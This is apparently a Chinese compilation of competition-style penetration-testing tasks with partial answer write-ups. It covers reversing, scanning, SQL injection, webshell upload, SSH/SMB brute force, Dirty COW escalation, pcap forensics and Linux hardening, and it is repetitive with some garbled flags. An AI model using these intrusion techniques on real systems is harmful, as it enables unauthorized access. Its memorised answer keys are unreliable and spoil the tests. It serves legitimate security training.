**B-9 任务九: PE Reverse**

\*任务说明:仅能获取 Server9 的 IP 地址

1.对靶机服务器场景桌面上的 PEOl.exe,二进制文件进行静态调试，将main
函数的入口地址作为 Flag 值提交;

![image.png](    赛题环境解析/media/image1.png){width="5.760416666666667in"
height="0.3950524934383202in"}

flag:0000000140001C68

2.对靶机服务器场景桌面上的
PEOl.exe.二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为
Flag 值提交:

![image.png](    赛题环境解析/media/image2.png){width="5.760416666666667in"
height="1.8245669291338582in"}

flag:sub_1400016A0

3.对靶机服务器场景桌面上的 PEOl.exe,二进制文件进行静态调试，找到Flag1
值并提交;

![image.png](    赛题环境解析/media/image3.png){width="3.7777777777777777in"
height="0.364248687664042in"}

4.对靶机服务器场景桌面上的
PEO1.exe.二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为
Flag 值提交;

5.对靶机服务器场景桌面上的
PEOl.exe,二进制文件进行静态调试，将该激活所需的许可证码作为 Flag 值提交;

**一、竞赛时间180 分钟 共计 3 小时**

服务器场景：Server2131

**1. 通过渗透测试平台 Kali 对靶机场景 Server2131
进行操作系统扫描渗透测试，并将该操作显示结果 "OS Details："
之后的字符串作为 Flag 值提交；**

**2. 通过渗透测试平台 Kali 对靶机场景 Server2131
进行系统服务及版本扫描渗透测试，并将该操作显示结果中 Apache Tomcat
中间件服务对应的服务版本号作为 Flag 值提交（如：3.6.78）；**

**3. 通过渗透测试平台 Kali 对靶机场景 Server2131
进行网站目录枚举渗透测试，使用工具 dirb 的默认字典来进行枚举，将 dirb
工具返回结果中的扫描到的目录数量作为 Flag 值提交；**

**4. 通过渗透测试平台 Kalie 对靶机场景 Server2131
进行网站目录枚举渗透测试，使用工具 dirb 的默认字典来进行枚举，将 dirb
工具返回结果中的最后一行的 URL 作为 Flag 值提交；（注：IP 地址使用
172.16.1.1 代替）**

**5. 通过渗透测试平台 Kali 对靶机场景 Server2131 进行渗透测试，将该场景
tomcat 网站渗透成功后回显的关键提示信息作为 Flag 值提交；**

**6. 通过渗透测试平台 Kali 对靶机场景 Server2131 进行渗透测试，将该场景
tomcat 网站根路径下唯一一个后缀为.png 文件的文件内容作为 Flag 值提交；**

**7. 通过渗透测试平台 Kali 对靶机场景 Server2131 进行渗透测试，将该场景
/root 目录中唯一一个后缀为.txt 文件中的 Flag1 作为 Flag 值提交。**

**任务环境说明：**

**√服务器场景：Server2202（关闭链接）**

**√用户名：hacker 密码：123456**

**二、竞赛阶段竞赛阶段 任务阶段 竞赛任务 竞赛时间 分值**

**1. 使用渗透机对服务器信息收集，并将服务器中 SSH 服务端口号作为 flag
提交；**

**2. 使用渗透机对服务器信息收集，并将服务器中主机名称作为 flag 提交；**

**3. 使用渗透机对服务器信息收集，并将服务器中系统内核版本作为 flag
提交；**

**4. 使用渗透机对服务器管理员提权，并将服务器中 root
目录下的文本内容作为 flag 提交；**

**5. 使用渗透机对服务器管理员提权，并将服务器中 root 的密码作为 flag
提交；**

**6. 使用渗透机对服务器管理员提权，并将服务器中 root
目录下的图片内容作为 flag 提交。**

**√服务器场景：Server2127**

**√服务器场景操作系统：未知（封闭[靶机](https://so.csdn.net/so/search?q=%E9%9D%B6%E6%9C%BA&spm=1001.2101.3001.7020)）**

**√用户名：未知 密码：未知**

**1. 访服务器网站目录 1，根据页面信息完成条件，将页面中的 flag 提交；**

**2. 访问服务器网站目录 2，根据页面信息完成条件，将页面中的 flag
提交；**

**3. 访问服务器网站目录 3，根据页面信息完成条件，将页面中的 flag
提交；**

**4. 访问服务器网站目录 4，根据页面信息完成条件，将页面中的 flag
提交；**

**5. 访问服务器网站目录 5，根据页面信息完成条件，将页面中的 flag
提交；**

**6. 访问服务器网站目录 6，根据页面信息完成条件，将页面中的 flag
提交；**

**B-3 CMS 网站渗透**

**任务环境说明：服务器场景：Server2206（关闭链接）服务器场景操作系统：未知**

**1. 使用渗透机对服务器信息收集，并将服务器中网站服务端口号作为 flag
提交；**

**2. 使用渗透机对服务器信息收集，将网站的名称作为 flag 提交；**

**3. 使用渗透机对服务器渗透，将可渗透页面的名称作为 flag 提交；**

**4. 使用渗透机对服务器渗透，并将网站中所用的数据库的表名作为 flag
提交；**

**5. 使用渗透机对服务器渗透，将网站管理员的加密密码作为 flag 提交**

**6. 使用渗透机对服务器渗透，将服务器的本地名称作为 flag 提交。**

**任务三十一： JavaScript安全绕过**

**任务环境说明：**

√ 服务器场景： Server2201（关闭链接）(F12)

    √ 服务器场景操作系统：Centos5.5

1. 
使用渗透机场景kali中工具扫描服务器，将服务器上apache版本号作为flag提交；

![截图.png](    赛题环境解析/media/image4.png){width="5.760416666666667in"
height="5.4017093175853015in"}

2. 
使用渗透机场景windows7访问服务器场景中的网站（网站路径为IP/javascript），找到网站首页中flag并提交；

![截图.png](    赛题环境解析/media/image5.png){width="5.760416666666667in"
height="4.364129483814523in"}

3. 
使用渗透机场景windows7根据第二题的入口继续访问服务器本题场景，通过提示得到flag并提交；

![截图.png](    赛题环境解析/media/image6.png){width="5.760416666666667in"
height="4.621186570428696in"}

4. 
使用渗透机场景windows7根据第三题入口继续访问服务器的本题场景，通过提示得到flag并提交；

![截图.png](    赛题环境解析/media/image7.png){width="5.760416666666667in"
height="4.273120078740157in"}

5. 
使用渗透机场景windows7根据第四题入口继续访问服务器的本题场景，通过提示得到flag并提交；

![截图.png](    赛题环境解析/media/image8.png){width="5.760416666666667in"
height="4.273120078740157in"}

6. 
使用渗透机场景windows7根据第五题入口继续访问服务器的本题场景，通过提示得到flag并提交；

![截图.png](    赛题环境解析/media/image9.png){width="5.760416666666667in"
height="4.273120078740157in"}

**任务五十二：SMB 信息收集**

**任务环境说明：**

√ 服务器场景： Server2111（ 封闭靶机）(windows/smb/psexec)

√ 用户名:administrator 密码： 未知

1.使用暴力破解工具对服务器的服务器信息块协议暴力破解，
字典在服务器网站的首页， 将获取的密码作为flag 提交；

![截图.png](    赛题环境解析/media/image10.png){width="5.760416666666667in"
height="5.587679352580928in"}

![截图.png](    赛题环境解析/media/image11.png){width="5.760416666666667in"
height="4.121274059492563in"}

2.使用访问工具对服务器服务访问， 将查看到最后一个文件的共享名称作为 flag
提交；

![截图.png](    赛题环境解析/media/image12.png){width="5.760416666666667in"
height="4.94249343832021in"}

3.使用访问工具对服务器服务访问，
将服务器中管理员桌面的文本文档里的内容作为 flag 提交；

![截图.png](    赛题环境解析/media/image13.png){width="5.760416666666667in"
height="5.11525043744532in"}

4.使用访问工具对服务器服务访问， 将服务器中DNS2 的地址作为 flag 提交；

![截图.png](    赛题环境解析/media/image14.png){width="5.760416666666667in"
height="5.4017093175853015in"}

5.使用访问工具对服务器服务访问， 将服务器中最后一个用户名作为 flag
提交；

![截图.png](    赛题环境解析/media/image15.png){width="5.760416666666667in"
height="5.4017093175853015in"}

**服务器场景：FTPServer20220509(关闭链接)**

FTP用户名:results密码：results

1.从靶机服务器的FTP上下载results.pcap，分析该文件，将数据包内图片数量作为FLAG提交。

![截图.png](    赛题环境解析/media/image16.png){width="5.760416666666667in"
height="3.134595363079615in"}

![截图.png](    赛题环境解析/media/image17.png){width="5.760416666666667in"
height="3.134595363079615in"}

FLAG: 421

2.对results.pcap数据包文件进行分析，将图片内隐藏的内容作为FLAG提交。

![截图.png](    赛题环境解析/media/image18.png){width="5.760416666666667in"
height="3.134595363079615in"}

FLAG: flag{ae58d0408e26e8f

3.对results.pcap数据包文件进行分析，将额外信息文件的关键词作为FLAG提交；

FLAG: 26a3c0589d23edeec}

![截图.png](    赛题环境解析/media/image19.png){width="5.760416666666667in"
height="3.134595363079615in"}

4.对results.pcap数据包文件进行分析，将过滤语句作为FLAG提交；(不包含空格)

![截图.png](    赛题环境解析/media/image20.png){width="5.760416666666667in"
height="3.136596675415573in"}

FLAG: tcp.stream eq 114

5.对results.pcap数据包文件进行分析，将数据包内完成字符作为FLAG提交；

FLAG: flag{ae58d0408e26e8f26a3c0589d23edeec}

**任务三十二： 中间件渗透测试-2**

**任务环境说明：**

√ 服务器场景： Server2131（关闭链接）

    √ 服务器场景操作系统：Linux

Flag值格式：Flag｛Xxxx123｝，括号中的内容作为 Flag值，提交 Xxxx123 即可

1.通过渗透测试平台Kali对靶机场景Server2131进行操作系统扫描渗透测试，并将该操作显示结果"OS
Details："之后的字符串作为Flag值提交；

2.通过渗透测试平台Kali对靶机场景Server2131进行系统服务及版本扫描渗透测试，并将该操作显示结果中Apache
Tomcat中间件服务对应的服务版本号作为Flag值提交（如：3.6.78）；

3.通过渗透测试平台Kali对靶机场景Server2131进行网站目录枚举渗透测试，使用工具dirb的默认字典来进行枚举，将dirb工具返回结果中的扫描到的目录数量作为Flag值提交； 

4.通过渗透测试平台Kalie对靶机场景Server2131进行网站目录枚举渗透测试，使用工具dirb的默认字典来进行枚举，将dirb工具返回结果中的最后一行的URL作为Flag值提交；（注：IP地址使用172.16.1.1代替）

5.通过渗透测试平台Kali对靶机场景Server2131进行渗透测试，将该场景tomcat网站渗透成功后回显的关键提示信息作为Flag值提交；

6.通过渗透测试平台Kali对靶机场景Server2131进行渗透测试，将该场景tomcat网站根路径下唯一一个后缀为.png文件的文件内容作为Flag值提交；

7.通过渗透测试平台Kali对靶机场景Server2131进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件中的Flag1作为Flag值提交。

**A-6：Linux操作系统安全配置**

**任务环境说明：**

ü 服务器场景：AServer02：（开放链接）

ü 用户名：root，密码：123456

1.设置禁止使用最近用过的6个旧密码，将配置文件中对应的部分截图;

![截图.png](    赛题环境解析/media/image21.png){width="5.760416666666667in"
height="0.14240813648293962in"}

2.设置密码复杂程度，允许重试3次，新密码必须与旧密码有4位不同，最小位数6位，大写字母至少包含2位，小写字母至少包含3位，特殊字母个数至少包含1位，将配置文件中对应的部分截图;

![截图.png](    赛题环境解析/media/image22.png){width="5.760416666666667in"
height="3.4911614173228345in"}

3.禁止匿名用户登录vsftpd服务，将配置文件中对应的部分截图；

![截图.png](    赛题环境解析/media/image23.png){width="5.760416666666667in"
height="2.5951367016622924in"}

4.设置关闭ftp-data端口不使用主动模式，使用ipv4进行监听，将配置文件中对应的部分截图；

![截图.png](    赛题环境解析/media/image24.png){width="5.760416666666667in"
height="0.5945603674540683in"}

![截图.png](    赛题环境解析/media/image25.png){width="2.986111111111111in"
height="0.7803423009623797in"}

5. 将Telnet服务的端口号修改为2323 ,查看Telnet服务端口信息，将回显结果截图；

![截图.png](    赛题环境解析/media/image26.png){width="5.760416666666667in"
height="1.0013331146106736in"}

![截图.png](    赛题环境解析/media/image27.png){width="5.760416666666667in"
height="4.19998031496063in"}

6.限制Telnet用户连接，单个IP允许的最大连接数为1，总的最大连接数为10，将配置文件中对应的部分截图；

[配置文件位置：vim /etc/xinetd.conf]{.mark}

![截图.png](    赛题环境解析/media/image28.png){width="5.760416666666667in"
height="2.617548118985127in"}

7.允许root用户通过SSH远程登录，将配置文件中对应的部分截图；

8.配置SSH服务，设置RSA证书登录，将配置文件中对应的部分截图；

![截图.png](    赛题环境解析/media/image29.png){width="5.760416666666667in"
height="3.6311537620297463in"}

9.修改网站的httpd服务为root权限，将配置文件中对应的部分截图；

![截图.png](    赛题环境解析/media/image30.png){width="5.760416666666667in"
height="3.2169870953630797in"}

10.设置HTTP服务，修改网站的配置文件，配置滚动日志按天记录网站的访问日志和错误日志，将配置文件中对应的部分截图。

vim /etc/logrotate.d/httpd

**任务一：数据库服务渗透测试**

**任务环境说明：**

ü 服务器场景：Server2101=server01=server03(湖南IU)

ü 服务器场景操作系统：linux

1. 通过分析靶机Server2101页面信息，寻找漏洞页面，将WEB服务存在SQL注入漏洞的页面名称作为Flag提交；

![截图.png](    赛题环境解析/media/image31.png){width="5.760416666666667in"
height="3.7174168853893264in"}

2. 通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB服务的数据库名称作为Flag提交；

![截图.png](    赛题环境解析/media/image32.png){width="5.760416666666667in"
height="3.7174168853893264in"}

3. 通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB服务用户的表名称作为Flag提交；

![截图.png](    赛题环境解析/media/image33.png){width="5.760416666666667in"
height="3.7174168853893264in"}

4. 通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB登陆用户admin用户的明文密码作为Flag提交；

![截图.png](    赛题环境解析/media/image34.png){width="5.760416666666667in"
height="1.1560695538057744in"}

1. 通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，将文件上传成功后的页面回显字符串作为Flag提交（如：点击超链接查看上传文件）

![截图.png](    赛题环境解析/media/image35.png){width="2.361111111111111in"
height="0.2820800524934383in"}

2. 通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用WHOAMI获取WEB当前的用户权限，并作为Flag进行提交；

![截图.png](    赛题环境解析/media/image36.png){width="4.930555555555555in"
height="0.40653652668416446in"}

3. 通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用相关指令获取到当前linux用户UID为5的用户，将该用户的用户名称作为Flag进行提交；

![截图.png](    赛题环境解析/media/image37.png){width="5.760416666666667in"
height="0.6642115048118985in"}

4. 通过本地PC中的渗透测试平台Kali对靶机进行WEB渗透，找到页面内的文件上传漏洞并且尝试进行上传攻击，使用相关的渗透测试手段，获取到WEB权限，使用相关指令查看后台首页文件，将该文件的第二行的所有字符串作为Flag进行提交；

![截图.png](    赛题环境解析/media/image38.png){width="5.760416666666667in"
height="2.5206758530183726in"}

\*任务说明：Server2 用户名：administrator，密码：123456

1.找出文件夹1 中的文件，将文件中的隐藏信息作为Flag 值提

交；

ctrl\^C即可拿到flag

flag{security_through_obscurity}

2.找出文件夹2 中的文件，将文件中的隐藏信息作为Flag 值提

交；

解压zip后分离data数据

flag{f0rens!cs!sC00L}

3.找出文件夹3 中的文件，将文件中的隐藏信息作为Flag 值提

交；

属性发现十六进制字符

十六进制转ascii即key

分离图片解压zip输入key

flag{3XiF_iNf0rM@ti0n}

4.找出文件夹4 中的文件，将文件中的隐藏信息作为Flag 值提

交；

010打开发现反png包头

python反向排序脚本

FLAG:flag{Mirr0r_R3f3ct1on_H1dd3n_f14g}

5.找出文件夹5 中的文件，将文件中的隐藏信息作为Flag 值提

交。

FTPServer20220509

隐藏信息探索

1.访问服务器的FTP服务，下载图片QR，从图片中获取flag，并将flag提交；

2.访问服务器的FTP服务，下载文件document，从文件中获取flag，并将flag提交；

发现是docx,docx的内容都是写在word目录的document.xml打开查看就是flag

![截图.png](    赛题环境解析/media/image39.png){width="5.760416666666667in"
height="4.057652012248469in"}

![截图.png](    赛题环境解析/media/image40.png){width="5.760416666666667in"
height="1.4009601924759405in"}

flag{RFCXQ0gy}

3.访问服务器的FTP服务，下载图片beach，从图片中获取flag，并将flag提交；

打开照片查看字符内容发现base64解压后解压分离后的zip就获得flag

![截图.png](    赛题环境解析/media/image41.png){width="5.760416666666667in"
height="2.833655949256343in"}

![截图.png](    赛题环境解析/media/image42.png){width="4.791666666666667in"
height="0.6458333333333334in"}

![截图.png](    赛题环境解析/media/image43.png){width="5.760416666666667in"
height="4.660437445319335in"}

![截图.png](    赛题环境解析/media/image44.png){width="5.760416666666667in"
height="4.439557086614173in"}

4.访问服务器的FTP服务，下载图片grass，从图片中获取flag，并将flag提交；

foremost分离就是flag

![截图.png](    赛题环境解析/media/image45.png){width="5.760416666666667in"
height="5.404577865266842in"}

5.访问服务器的FTP服务，下载图片tree，从图片中获取flag，并将flag提交；

修改高

![截图.png](    赛题环境解析/media/image46.png){width="5.760416666666667in"
height="3.7483770778652667in"}

![截图.png](    赛题环境解析/media/image47.png){width="5.760416666666667in"
height="5.729446631671041in"}

6.访问服务器的FTP服务，下载压缩文件style，从压缩文件中获取flag，并将flag提交。

流量数据取证

![截图.png](    赛题环境解析/media/image48.png){width="5.760416666666667in"
height="5.200488845144357in"}

![截图.png](    赛题环境解析/media/image49.png){width="5.760416666666667in"
height="2.8406627296587925in"}

python渗透

1.从靶机服务器的FTP上下载weak_password.py，编辑Python程序，使该程序实现弱口令爆破，填写该文件当中空缺的F1字符串，生成密码列表

2.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F2字符串，填写连接的host；

3.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F3字符串，填写连接的密码；

4.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F4字符串，写出连接失败的处理逻辑；

5.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F5字符串，写出连接成功的处理逻辑；

6.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F6字符串，写出判断result的值即可知道是否爆破成功；

代码渗透技术

1.从靶机服务器的FTP上下载flag0072，分析该文件，请提交代码保护技术的类型。提交格式：XXXX。

2.提交被保护的代码所在地址。提交格式： 0xXXXX。

3.提交代码解密的密钥。提交格式： 0xXX。

4.请提交输入正确flag时的输出。提交格式： XXXX。

5.提交flag的值。提交格式：XXXX。

**任务七：Linux操作系统渗透测试-2**

**任务环境说明：**

√ 服务器场景：Linux2106

√ 服务器场景操作系统：Linux（版本不详）（关闭链接）

1. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务版本信息字符串作为Flag值提交；

2. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；

3. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；

4. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；

5. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；

6. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；

7. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；

8. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称作为Flag值提交；

9. 
通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。

服务器内部信息获取

任务环境说明：

服务器场景：Linux20210510

服务器场景操作系统：Linux（封闭靶机）

用户名:test密码：123456

搜集服务器场景中的服务信息。并获取服务器中开放的端口号信息，将服务器端口号作为flag提交（如果有多个端口以;分割，如11;22;33）;

FLAG: 22;111;6000

![image.png](    赛题环境解析/media/image50.png){width="5.611111111111111in"
height="3.0141469816272966in"}

将服务器中tmp文件夹下的字典下载至本地，并将字典中最后一位用户名作为flag提交;

ssh连接后使用python开启http文件传输

直接通过http下载文件

FLAG: BqMkbn

ps:py给的答案是倒数第二个nfyHvb

应用工具获取服务器中黑客账户（hacker）的密码。并将黑客的密码作为flag提交;

hydra爆破ssh服务

FLAG: xhm9NG

在服务器中查看sudo软件的版本，将sudo的版本最为flag提交;

rpm查看软件版本

FLAG:1.8.23

在服务器中登录恶意用户，查看恶意用户在服务器中输入的第一条指令，将指令作为flag提交;

在/etc/passwd中发现SZAyUX用户该用户名存在于username.txt

username账户字典进行爆破

FLAG:whoami

在服务器中查看用户信息，将最后一个用户的用户名作为flag提交;

在/etc/passwd中未无法查看最后的用户

查看/etc/shadow发现无权限

在hacker用户的历史纪录中发现对应命令记录

在服务器中查看用户信息，将最后一个用户的用户名作为flag提交;

在/etc/passwd中未无法查看最后的用户

查看/etc/shadow发现无权限

在hacker用户的历史纪录中发现对应命令记录

提示hacker用户不在sudoers file

尝试在而已用户中执行该指令

FLAG: Stand_by_me

任务环境说明：

✓ 服务器场景：Server07

✓ 服务器场景操作系统：未知（关闭连接）

通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，将后台管理员登陆的地址作为Flag提交；（IP地址用0.0.0.0代替
例如：<http://0.0.0.0.0/login.php>）

/admin.php疑似后台 验证成功

FLAG: <http://0.0.0.0/admin.php>

2\.
通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，将后台管理员的密码作为Flag提交；

弱口令admin/admin

FLAG:admin

3\.
通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，获取到相应的权限，使用相关命令获取到当前系统用户id为69的用户，将该用户的用户名称作为Flag进行提交；

添加模板fopen打开test.php
fputs将内容写入test.php删去xml访问以实现调用执行php

成功写入文件 同理写入webshell 蚁剑连接

FLAG:vcsa

4\.
通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，获取到相应的权限，使用whoami命令获取当前用户,将获取到的用户作为Flag提交；

FLAG:apache

5\.
通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，获取到相应的权限，将/var/www目录下的图片文件内容作为Flag提交；

FLAG:security

6\.
通过PC中的渗透测试平台Kali对服务器场景进行渗透测试，找到靶机内的脏牛漏洞提权文件，将文件名作为Flag提交；

上边查看passwd发现用户admin结合上边的ssh服务九头蛇爆破ssh连接后在admin目录下找到脏牛编译文件

FLAG:dirty

7\.
提权之后登陆靶机，进入靶机的/root目录将root目录的flag.txt文件的内容作为Flag提交；

FLAG: c4ca4238a0b923820dcc509a6f75849b

**B-10：网页渗透-21**

**任务环境说明：**

ü 服务器场景：Server21=server2120

ü 服务器场景操作系统：linux

ü 用户名:未知 密码：未知

1. 访问服务器网站目录1，根据页面信息完成条件，将获取到的flag提交；

![截图.png](    赛题环境解析/media/image51.png){width="5.760416666666667in"
height="3.7384787839020124in"}

2. 访问服务器网站目录2，根据页面信息完成条件，将获取到的flag提交；

![截图.png](    赛题环境解析/media/image52.png){width="5.760416666666667in"
height="1.9650021872265966in"}

3. 访问服务器网站目录3，根据页面信息完成条件，将获取到的flag提交；(sqlmap一把过,数字爆破也可以)

![截图.png](    赛题环境解析/media/image53.png){width="5.760416666666667in"
height="2.681884295713036in"}

4. 访问服务器网站目录4，根据页面信息完成条件，将获取到的flag提交；

![截图.png](    赛题环境解析/media/image54.png){width="5.760416666666667in"
height="2.550655074365704in"}

5. 访问服务器网站目录5，根据页面信息完成条件，将获取到的flag提交；

![截图.png](    赛题环境解析/media/image55.png){width="5.760416666666667in"
height="2.7454090113735785in"}

6. 访问服务器网站目录6，根据页面信息完成条件，将获取到的flag提交；

![截图.png](    赛题环境解析/media/image56.png){width="5.760416666666667in"
height="2.5707272528433944in"}

**B-2：攻击日志分析**

**任务环境说明：**

服务器场景：FTPServer0520

服务器场景操作系统：未知（关闭连接）

FTP用户名：hacker1密码：hacker1

![截图.png](    赛题环境解析/media/image57.png){width="5.760416666666667in"
height="0.8000579615048119in"}

登录FTP下载数据包文件hacker1.pacapng，分析出黑客扫描得到的靶机开放的端口，将靶机开放的端口作为FLAG（形式：\[端口名1,端口名2,端口名3...,端口名n\]）从低到高提交；首先看到这种找端口的题目，一般出题人用的都nmap。Nmap扫端口都是用同一个端口扫描，所以看\[tcp\]类型的包。

> 可以看见，全部都是一些端口往\[33557\]端口发送数据包，所以初步断定这个\[dst\]ip应该八成是黑客ip\[192.168.1.10\]

![截图.png](    赛题环境解析/media/image58.png){width="5.760416666666667in"
height="1.7187707786526685in"}

![截图.png](    赛题环境解析/media/image59.png){width="5.760416666666667in"
height="1.6938702974628173in"}

> 再次进行过滤\[tcp.port==33556&&ip.src==192.168.1.10\]
> 一般这种发送\[RST\]数据包的就是开放端口的，然后你也可以看右边，有颜色不同的，一般都是开放的端口

Flag{80,135,139,445,3389,49152,49153,49154,49155,49156,49157}

继续查看数据包文件hacker1.pacapng，分析出黑客成功入侵后获得的操作系统的版本号，将操作系统的版本号作为FLAG（形式:\[操作系统版本号\]）提交；这题一般不是FTP或SSH就是Telnet了但是

![截图.png](    赛题环境解析/media/image60.png){width="5.760416666666667in"
height="1.6068755468066491in"}

![截图.png](    赛题环境解析/media/image61.png){width="5.760416666666667in"
height="2.3173731408573928in"}

![截图.png](    赛题环境解析/media/image62.png){width="5.760416666666667in"
height="2.553483158355206in"}

> 发现了一个奇怪的协议没见过的
>
> \[Windows 7 or Windows Server 2008 R2\] 以为是flag 但是这个是错误的
>
> 然后我在看了看别的协议,一个都没有,不经陷入了沉思。。。
>
> {思路2：查看第一题，发现有445端口，而且还有4万一上的端口，我认为是台windows}
>
> 既然是windows7或者2008而且还开了445那八成一个就是一个17-010的数据包了，直接\[tcp.port==4444\]

![截图.png](    赛题环境解析/media/image63.png){width="5.760416666666667in"
height="2.2666535433070867in"}

> 随便找一个数据包，右键追踪流\>tcp流
>
> 应该是答案了

![截图.png](    赛题环境解析/media/image64.png){width="5.760416666666667in"
height="4.630269028871391in"}

Flag[{ 6.1.760]{.mark}1}

继续查看数据包文件hacker1.pacapng，分析出黑客成功入侵后执行的第一条命令，并将执行的第一条命令作为FLAG（形式：\[第一条命令\]）提交；看上题也可以得出Flag{whoami}

继续查看数据包文件hacker1.pacapng，分析出黑客成功入侵后执行的第二条命令，并将执行的第二条命令作为FLAG（形式：\[第二条命令\]）提交；同上Flag{net
user}

继续查看数据包文件hacker1.pacapng，分析出黑客成功入侵后执行的第一条命令的返回结果，并将执行的第一条命令返回结果作为FLAG（形式：\[第二条命令返回结果\]）提交；同上Flag:\[
win-k1unj4kn7qj\\administrator\]

继续查看数据包文件hacker1.pacapng，分析出黑客成功入侵后执行的第三条命令的返回结果，并将执行的第三条命令返回结果作为FLAG（形式：\[第三条命令返回结果\]）提交。同上Fla[g\[\'pwd\'
\...\...\...\...\...\...\...\...\...\...\...\...\...\...\...\.....]{.mark}..\]

![截图.png](    赛题环境解析/media/image65.png){width="5.760416666666667in"
height="4.334027777777778in"}

**B-3：Python渗透测试**

**任务环境说明：**

服务器场景：FTPServer0520

服务器场景操作系统：未知（关闭链接）

FTP用户名：410密码：401

从靶机服务器的FTP上下载410.py，编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag1字符串，将该字符串作为Flag值提交；

flag{IP}

继续编辑Python程序410.py，使该程序实现基于TCP/UDP全开的端口扫描，填写该文件当中空缺的flag2字符串，将该字符串作为Flag值提交

Flag{TCP}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag3字符串，将该字符串作为Flag值提交；//提示说是
异常退出

> 所以flag 应该是 sys.exit(1)

![截图.png](    赛题环境解析/media/image66.png){width="3.5972222222222223in"
height="0.3580566491688539in"}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag4字符串，将该字符串作为Flag值提交；
flag4被包进range()方法里面所以是个\[int\]类型，然后再分析这一段发现是输入传参

> 应该是用 \[sys.argv()，第一个是给了ip,然后第二个和第三个是端口，
>
> 但是\[sys.argv\]返回的值是\[str\]类型所以用到
> \[int()\]方法转换为int类型

Flag{int(sys.argv\[2\])}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag5字符串，将该字符串作为Flag值提交；因为python
range()方法获取的值是 x,y-1,就是说后一位数最后实际是到达不了的会，列如

> // range(1,10) 实际上就是 1-9，所以就是为什么 后面要+1，这个比较细

Flag{int(sys.argv\[3\])+1}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag6字符串，将该字符串作为Flag值提交；
这个flag7 也没什么好说的

> [#python2.7]{.mark}
>
> [a = 123b = type(str(a))print type(b)]{.mark}
>
> [//返回值为：\<type \'type\'\>]{.mark}
>
> 所以直接写一个 \[type(resp)\]是不对的返回值不是\[str\]类型
>
> 得 加上 \[str()\]方法

Flag{type(resp)}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag7字符串，将该字符串作为Flag值提交；

![截图.png](    赛题环境解析/media/image67.png){width="5.760416666666667in"
height="0.5236745406824147in"}

> 这个其实自己最好可以去抓一下哪个\[nmap\]扫描端口的数据包，自己分析一下
>
> 来看这两个包，\[79\]端口关闭 \[80\]端口开放
> 看详细信息：下面这个是\[79\]

![截图.png](    赛题环境解析/media/image68.png){width="5.760416666666667in"
height="2.4029166666666666in"}

> 这个是\[80\]

![截图.png](    赛题环境解析/media/image69.png){width="5.760416666666667in"
height="2.4876410761154855in"}

分析总结:

1,数据包发送的协议不同

2,数据包的flags不同

3,TCP
flags的结果也不同得出:开放端口的\[flags\]为0x012,关闭端口的为\[0x014\];

TCP Flags开放的为AS 关闭的为AR

我一开始flag7 flag8填写的都是 AS 和
AR因为自己也写了一个类似的脚本，当时还是错的，发现得填写
0x12和0x14才可以 (前面的0去掉是多余的)

Flag{0x12}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag8字符串，将该字符串作为Flag值提交；同上题

Flag{0x14}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag9字符串，将该字符串作为Flag值提交。

> 这个提示为 正常退出 所以说
>
> flag应该就是 退出函数几个 \[exit,quit,sys.exit(0),os.exit\]
>
